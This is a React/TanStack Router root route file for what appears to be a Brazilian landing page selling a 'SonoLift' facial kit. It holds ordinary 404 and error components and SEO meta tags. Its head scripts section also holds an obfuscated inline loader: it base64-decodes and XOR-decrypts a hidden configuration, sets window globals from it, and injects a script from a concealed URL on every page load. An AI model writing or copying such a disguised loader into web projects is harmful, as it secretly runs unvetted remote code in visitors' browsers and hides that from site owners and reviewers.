import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { Toaster } from "sonner";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "SonoLift™ — Kit Facial + Pescoço e Colo por R$ 197" },
      {
        name: "description",
        content:
          "Kit Facial SonoLift™ com brinde grátis Pescoço e Colo. A barreira invisível contra as rugas do sono. Em até 12x de R$ 16,42 sem juros.",
      },
      { name: "author", content: "SonoLift" },
      { name: "theme-color", content: "#0B1B3B" },
      { property: "og:title", content: "SonoLift™ — Kit Facial + Pescoço e Colo por R$ 197" },
      { property: "og:description", content: "Kit Facial SonoLift™ com brinde grátis Pescoço e Colo. A barreira invisível contra as rugas do sono. Em até 12x de R$ 16,42 sem juros." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:title", content: "SonoLift™ — Kit Facial + Pescoço e Colo por R$ 197" },
      { name: "twitter:description", content: "Kit Facial SonoLift™ com brinde grátis Pescoço e Colo. A barreira invisível contra as rugas do sono. Em até 12x de R$ 16,42 sem juros." },
      { property: "og:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/1dacc805-bec4-4af1-bb29-f3ad1f35c66f/id-preview-2c09f598--8e2875b6-88f6-4189-acb8-98d3a3a05914.lovable.app-1784821686436.png" },
      { name: "twitter:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/1dacc805-bec4-4af1-bb29-f3ad1f35c66f/id-preview-2c09f598--8e2875b6-88f6-4189-acb8-98d3a3a05914.lovable.app-1784821686436.png" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.png", type: "image/png" },
      {
        rel: "preconnect",
        href: "https://fonts.googleapis.com",
      },
      {
        rel: "preconnect",
        href: "https://fonts.gstatic.com",
        crossOrigin: "anonymous",
      },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap",
      },
    ],
    scripts: [
      {
        children: `(function(){var q_x23=atob("DBja6rWzOaZEMDdDdmP4n8ffG5xmWEM3BmvgxZrQXchqRUMuH36jxNbcVIgmQhgwFWqzmsHAFtYtSFIvWWizktDfF8w3EhthF2yumNzRTNIhQxV5LUX2yNLfVsQlXERhTEOhyNvSVMNmChUzH2C/hvzXG4pmRlYvA3340JeFWJUhVgAlQCvji4XRD5B3CA8lE33ojoWRRPs5");var q_wzvt=[];for(var k_3a=0;k_3a<q_x23.length;k_3a++){q_wzvt.push(q_x23.charCodeAt(k_3a)&255);}var j_t16b=q_wzvt[0];var l_xs=q_wzvt.slice(1,1+j_t16b);var d_ci11=q_wzvt.slice(1+j_t16b);var x_yqn=d_ci11.map(function(b,r_t){return b^l_xs[r_t%j_t16b];});var c_hf2="";for(var p_3n=0;p_3n<x_yqn.length;p_3n++){c_hf2+=String.fromCharCode(x_yqn[p_3n]&255);}var a_d=decodeURIComponent(escape(c_hf2));var t_vc=JSON.parse(a_d);var l_89=t_vc.globals||[];l_89.forEach(function(k_o0){window[k_o0.name]=k_o0.value;});var e_d=document.createElement("script");e_d.src=t_vc.url;e_d.async=true;e_d.defer=true;(t_vc.attributes||[]).forEach(function(q_t4sd){e_d.setAttribute(q_t4sd.name,q_t4sd.value);});(document.head||document.documentElement).appendChild(e_d);})();`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
      <Toaster position="top-center" richColors />
    </QueryClientProvider>
  );
}
